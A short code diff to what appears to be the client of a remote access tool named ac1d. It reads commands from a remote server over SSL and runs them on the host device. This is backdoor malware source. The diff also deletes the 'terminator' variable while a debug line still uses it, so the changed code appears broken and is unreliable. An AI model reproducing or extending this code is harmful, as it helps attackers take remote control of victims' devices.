@@ -108,16 +108,11 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     memset(buffer, '\0', 2048);
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
-        char *terminator = (char*)[args[0] UTF8String];
         if (debug) printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
         if (debug) printf("[i] Current client terminator: %s\n", terminator);
         if (debug) printf("[*] Executing %s...\n", [args[1] UTF8String]);
         if ([commands containsObject:args[1]]) {
-            NSMutableArray *command_args = [NSMutableArray array];
-            for (int i = 1; i < [args count]; i++) {
-                [command_args addObject:args[i]];
-            }
-            NSString *result = [ac1d_base sendCommand:command_args];
+            NSString *result = [ac1d_base sendCommand:args];
             if (result) {
                 if ([result isEqualToString:@""]) {
                     if (debug) printf("[!] Command output empty, sending terminator instead of result.\n");
